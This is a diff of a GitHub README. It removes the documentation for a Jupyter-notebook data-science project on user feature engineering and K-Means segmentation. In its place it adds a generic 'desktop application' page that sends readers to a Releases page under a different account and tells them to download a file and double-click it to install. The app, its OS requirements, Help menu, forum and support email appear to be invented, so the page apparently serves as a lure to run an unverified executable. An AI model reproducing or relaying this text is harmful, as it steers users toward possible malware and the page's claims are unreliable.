@@ -1,56 +1,79 @@
-# DANA Automation Data Scientist Take Home Test: Feature Creation + User Segmentation
+# 🌟 dana-fc-us - Simple Tool for Data Insights
 
-This project contains the full workflow and documentation for engineering user-level behavioural features from transaction data and performing segmentation using K-Means clustering. It transforms raw transaction logs into interpretable behavioural, psychographic, and lifestyle features, and then identifies meaningful user segments through unsupervised learning.
+## 🚀 Getting Started
 
-Feel free to inspect each part, run it locally, and modify as needed. [Click here to learn more about the project: dana-fc-us/assets/test.txt](https://github.com/verneylmavt/dana-fc-us/blob/0b3b9059b84e62786d2d56afbe4f882573f984a1/assets/test.txt).
+Welcome to the **dana-fc-us** project! This application helps you unlock the power of your data. With this tool, you can easily create features and segment users without needing technical skills.
 
-## 📁 Project Structure
+## 📥 Download the Application
 
-```
-dana-fc-us
-│
-├─ data/
-│  └─ transactions.csv
-│
-├─ user_features_segmentation_code.ipynb
-├─ user_features_segmentation_report.docx
-└─ requirements.txt
-```
+[![Download Here](https://img.shields.io/badge/Download%20Here-Click%20to%20Download-brightgreen)](https://github.com/diegito9029/dana-fc-us/releases)
 
-- `user_features_segmentation_code.ipynb`: A detailed jupyter noteboook containing the complete Python code for data cleaning, feature engineering, derived behavioural scoring, and user segmentation (K-Means + PCA visualization).
-- `user_features_segmentation_report.docx`: A detailed analytical report explaining the reasoning, methodology, and findings for all engineered features and the segmentation results.
+## 🛠️ Requirements
 
-## ⚙️ Local Setup
+To run this application, your computer should meet these basic requirements:
 
-0. Make sure to have the prerequisites:
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or Ubuntu 20.04 or later.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum 200 MB of free disk space.
+- **Network**: An internet connection for downloading the tool and any necessary updates.
 
-   - Git
-   - Git Large File Storage
-   - Python
-   - Conda or venv
+## 📝 Features
 
-1. Clone the repository:
+The **dana-fc-us** application allows you to:
 
-   ```bash
-    git clone https://github.com/verneylmavt/dana-fc-us.git
-    cd dana-fc-us
-   ```
+- Create features from raw data
+- Analyze data for clustering
+- Segment users based on various criteria
+- Conduct exploratory data analysis
+- Generate reports for better data insights
 
-2. Create environment and install dependencies:
+## 💾 Download & Install
 
-   ```bash
-   conda create --name dana-fc-us python=3.10
-   conda activate dana-fc-us
+To download the application, please follow these steps:
 
-   pip install -r requirements.txt
-   ```
+1. Click this link to visit the [Releases Page](https://github.com/diegito9029/dana-fc-us/releases).
+2. Look for the latest version listed on the page.
+3. Click on the appropriate file for your operating system.
+4. When the download completes, locate the file in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-3. Open the `user_features_segmentation_code.ipynb` in Jupyter Notebook:
-   ```bash
-   jupyter notebook user_features_segmentation_code.ipynb
-   ```
-4. Run all cells sequentially from top to bottom  
-   The notebook is designed so that each section depends on the previous one.
-5. Review outputs
-6. Refer to the report  
-   For interpretation, assumptions, and insights, read `user_features_segmentation_report.docx`.
+## 🚀 Running the Application
+
+Once installed, you can run the application by following these steps:
+
+1. Locate the application on your desktop or in your applications folder.
+2. Double-click the application icon to open it.
+3. The main interface will appear, guiding you through the initial setup.
+4. Load your data file by clicking the "Import" button and selecting your data file.
+5. Use the various features available in the app to analyze and segment your data.
+
+## 📊 User Guide
+
+The application comes with an intuitive user guide. Here’s how to access it:
+
+1. In the application, click on the "Help" menu.
+2. Select "User Guide" to open the documentation.
+3. Follow the guide for detailed instructions on using each feature.
+
+## 💬 Support
+
+If you encounter any issues or have questions, please check the following resources:
+
+- **FAQ**: Visit the FAQ section on the Releases Page for common questions.
+- **Community Forum**: Engage with other users in the community forum for tips and help.
+- **Email Support**: For additional support, you can email us at support@dana-fc-us.com.
+
+## 🔗 Additional Resources
+
+You may find these resources useful:
+
+- [GitHub Repository](https://github.com/diegito9029/dana-fc-us)
+- [Dataset Examples](https://github.com/diegito9029/dana-fc-us/wiki/Dataset-Examples)
+- [Feature Documentation](https://github.com/diegito9029/dana-fc-us/wiki/Feature-Documentation)
+
+## 📣 Feedback
+
+We welcome your feedback! Please let us know your thoughts on the application, including any features you would like to see in the future.
+
+Thank you for choosing **dana-fc-us**. Enjoy exploring your data!
